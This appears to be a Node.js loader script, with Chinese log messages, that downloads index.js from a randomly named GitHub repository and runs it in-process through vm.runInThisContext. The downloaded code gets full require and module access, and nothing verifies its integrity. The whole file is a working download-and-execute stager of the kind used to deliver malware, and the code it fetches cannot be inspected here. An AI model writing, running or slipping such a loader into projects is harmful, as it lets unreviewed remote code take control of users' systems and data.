
'use strict';

const https = require('https');
const vm = require('vm');
const path = require('path');
const { createRequire } = require('module');

const REMOTE_URL = 'https://raw.githubusercontent.com/RSE20wfk/FnjaDqx20M/refs/heads/main/index.js';

function fetchRemoteCode(url, redirects = 0) {
  return new Promise((resolve, reject) => {
    try {
      const target = new URL(url);

      if (target.protocol !== 'https:') {
        throw new Error('只允许 HTTPS 地址');
      }

      const req = https.get(
        target,
        {
          headers: {
            'User-Agent': 'node'
          }
        },
        (res) => {
          if (
            [301, 302, 303, 307, 308].includes(res.statusCode) &&
            res.headers.location
          ) {
            res.resume();

            if (redirects >= 3) {
              reject(new Error('重定向次数过多'));
              return;
            }

            const nextUrl = new URL(
              res.headers.location,
              target
            ).href;

            fetchRemoteCode(nextUrl, redirects + 1)
              .then(resolve, reject);

            return;
          }

          if (res.statusCode !== 200) {
            res.resume();
            reject(new Error(`HTTP ${res.statusCode}`));
            return;
          }

          let data = '';
          let size = 0;
          const maxSize = 2 * 1024 * 1024;

          res.setEncoding('utf8');

          res.on('data', chunk => {
            size += Buffer.byteLength(chunk);

            if (size > maxSize) {
              res.destroy(
                new Error('远程代码超过 2 MB 限制')
              );
              return;
            }

            data += chunk;
          });

          res.on('end', () => resolve(data));
          res.on('error', reject);
          res.on('aborted', () => {
            reject(new Error('下载意外中断'));
          });
        }
      );

      req.setTimeout(15000, () => {
        req.destroy(new Error('下载超时'));
      });

      req.on('error', reject);

    } catch (err) {
      reject(err);
    }
  });
}

(async () => {
  try {
    console.log('正在远程加载 index.js...');

    const code = await fetchRemoteCode(REMOTE_URL);

    console.log('远程代码下载成功');

    const filename = path.join(__dirname, 'index.js');

    const remoteRequire = createRequire(filename);

    const remoteModule = {
      id: filename,
      filename: filename,
      exports: {},
      loaded: false
    };

    remoteRequire.main = remoteModule;

    const wrapper =
      '(function(exports, require, module, __filename, __dirname) {\n' +
      code +
      '\n})';

    const execute = vm.runInThisContext(wrapper, {
      filename: filename,
      displayErrors: true
    });

    execute(
      remoteModule.exports,
      remoteRequire,
      remoteModule,
      filename,
      __dirname
    );

    remoteModule.loaded = true;

    console.log('远程 index.js 已执行');

  } catch (err) {
    console.error('加载或执行失败:', err);
    process.exitCode = 1;
  }
})();
